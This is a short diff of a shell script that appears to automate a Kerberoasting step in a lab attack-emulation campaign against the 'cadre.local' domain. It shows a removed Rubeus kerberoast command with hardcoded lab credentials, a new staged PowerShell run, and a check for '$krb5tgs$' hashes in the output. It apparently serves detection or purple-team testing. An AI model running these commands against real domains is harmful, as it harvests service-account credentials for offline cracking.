@@ -8,10 +8,14 @@ T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
 echo "=== T002 | ${CASE_ID} | T0=${T0} ==="
 
 ws01_ensure_rubeus
-
 echo "--- Kerberoast via Rubeus using intern_blue credentials (AVOIDS double-hop / password reset) ---"
-ws01_exec_as analyst_t1 'T13r_An@lyst!' \
-  'C:\Tools\cadre-attack\Rubeus.exe kerberoast /creduser:child.cadre.local\intern_blue /credpassword:1nt3rn_Blu3! /creddomain:child.cadre.local /domain:child.cadre.local /dc:dc02.child.cadre.local /nowrap'
+OUT="$(campaign_stage_run_ps1 analyst_t1 'T13r_An@lyst!' campaign-a-t002-kerb.ps1)"
+printf '%s\n' "${OUT}"
+if ! printf '%s' "${OUT}" | grep -qE '\$krb5tgs\$|Hashcat format'; then
+  echo "T002_FAIL: no Kerberoast hash in Rubeus output" >&2
+  exit 1
+fi
+echo "T002_OK"
 
 cadre_export "${CASE_ID}" T002 "${T0}" 192.168.77.62
 echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
